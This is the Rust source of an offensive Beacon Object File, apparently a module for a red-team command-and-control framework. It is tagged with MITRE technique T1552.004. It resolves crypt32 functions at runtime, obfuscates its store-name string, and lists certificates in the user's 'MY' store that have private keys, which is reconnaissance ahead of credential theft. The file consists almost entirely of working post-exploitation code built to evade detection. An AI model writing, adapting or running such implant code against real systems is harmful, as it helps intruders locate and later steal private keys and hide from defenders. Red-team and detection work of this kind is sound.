#![no_std]
#![cfg_attr(not(test), no_main)]

use core::ffi::c_void;
use rustbof::{println, eprintln};
use common::{mitre::Technique, dfr_fn, obf_cstr};

const TECHNIQUES: &[Technique] = &[
    Technique { id: "T1552.004", name: "Unsecured Credentials: Private Keys", tactic: "Credential Access" },
];

const CERT_KEY_PROV_INFO_PROP_ID: u32 = 2;

dfr_fn!(cert_open_system_store_a(prov: usize, store: *const i8) -> *mut c_void, module = "crypt32.dll", api = "CertOpenSystemStoreA");
dfr_fn!(cert_enum_certificates_in_store(store: *mut c_void, prev: *const c_void) -> *const c_void, module = "crypt32.dll", api = "CertEnumCertificatesInStore");
dfr_fn!(cert_get_certificate_context_property(ctx: *const c_void, prop_id: u32, data: *mut u8, size: *mut u32) -> i32, module = "crypt32.dll", api = "CertGetCertificateContextProperty");
dfr_fn!(cert_close_store(store: *mut c_void, flags: u32) -> i32, module = "crypt32.dll", api = "CertCloseStore");
dfr_fn!(cert_get_name_string_a(ctx: *const c_void, name_type: u32, flags: u32, type_para: *const c_void, name: *mut i8, size: u32) -> u32, module = "crypt32.dll", api = "CertGetNameStringA");

#[rustbof::main]
fn main() {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    match run() {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run() -> Result<(), &'static str> {
    obf_cstr! { let store_name = c"MY"; }
    let store = unsafe { cert_open_system_store_a(0, store_name.as_ptr() as *const i8) }.map_err(|_| "resolve failed")?;
    if store.is_null() { return Err("store open failed"); }

    println!("{:<50} {}", "Subject", "Has Private Key");
    println!("{}", "--------------------------------------------------------------");

    let mut ctx: *const c_void = core::ptr::null();
    let mut count = 0u32;
    loop {
        ctx = unsafe { cert_enum_certificates_in_store(store, ctx) }.map_err(|_| "resolve failed")?;
        if ctx.is_null() { break; }

        let mut name_buf = [0i8; 256];
        unsafe { let _ = cert_get_name_string_a(ctx, 1, 0, core::ptr::null(), name_buf.as_mut_ptr(), 256); }

        let mut size: u32 = 0;
        let has_key = unsafe { cert_get_certificate_context_property(ctx, CERT_KEY_PROV_INFO_PROP_ID, core::ptr::null_mut(), &mut size) }.map_err(|_| "resolve failed")? != 0;

        let name_s = cstr_to_str(&name_buf);
        if has_key {
            println!("[+] {:<48} YES", name_s);
            count += 1;
        } else {
            println!("    {:<48} no", name_s);
        }
    }

    println!("\n[*] {} certificate(s) with private keys found", count);
    unsafe { let _ = cert_close_store(store, 0); }
    Ok(())
}

fn cstr_to_str(buf: &[i8]) -> &str {
    let bytes = unsafe { core::slice::from_raw_parts(buf.as_ptr() as *const u8, buf.len()) };
    let end = bytes.iter().position(|&b| b == 0).unwrap_or(bytes.len());
    core::str::from_utf8(&bytes[..end]).unwrap_or("?")
}
